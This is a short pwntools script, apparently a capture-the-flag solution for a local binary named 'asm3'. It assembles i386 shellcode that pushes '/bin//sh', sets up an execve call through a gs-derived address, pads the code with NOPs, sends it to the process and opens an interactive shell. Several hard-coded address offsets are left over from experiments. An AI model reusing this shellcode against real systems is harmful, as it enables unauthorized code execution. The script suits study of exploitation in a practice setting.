from pwn import *
from hashlib import sha1

r = process ("./asm3")
context.arch = 'i386'
context.os = 'linux'

#offset = 0xf7e06700 - 0xf7fd9000
offset = 0xf7f49e00 - 0xf7e07000
offset = 0xf7e07000 - 0xf7e06700 + 0x3a940 
offset = 0xf7e09c87 - 0xf7e06700 
print hex(offset)
sc = ""
#sc += asm("mov gs:0x1, edx")
sc += asm("mov esp, dword ptr gs:[ebx+0x0];")
sc += asm("mov eax, esp")
sc += asm("add ax, 0x3587")
sc += asm("mov edi, eax")
sc += asm("xor eax, eax")
sc += asm("mov al, 11")
sc += asm("push 0x68732f2f")
sc += asm("push 0x6e69622f")
sc += asm("mov ebx, esp")
sc += asm("call edi")

print len(sc)
#sc = "\xb0\x63\x8e\xe0\x64\x8b\x7b\x10\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8b\xdc\xff\xe7".rjust(30, "\x90")

f = open ("test_asm", "wb")
f.write (sc.ljust(30, "\x90"))
f.close ()
r.sendline (sc.ljust (30, "\x90"))

r.interactive ()



